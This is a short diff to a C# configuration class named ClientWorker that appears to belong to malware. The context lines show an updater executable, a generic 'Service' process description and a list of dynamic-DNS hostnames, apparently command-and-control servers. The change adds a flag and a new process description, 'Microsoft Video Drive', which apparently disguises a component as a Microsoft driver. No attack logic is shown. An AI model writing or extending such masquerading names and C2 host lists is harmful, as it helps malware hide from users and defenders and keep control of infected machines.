@@ -16,6 +16,9 @@ namespace ClientWorker
 		public static string updater = "Updater.exe";
         public static string DescriptionProcess = "Service";
 
+        public static bool isWorkingM = false;
+        public static string MProcDescription = "Microsoft Video Drive";
+
         public static List<string> ddnsHostName = new List<string>
 		{
 			"fokes1.asuscomm.com",
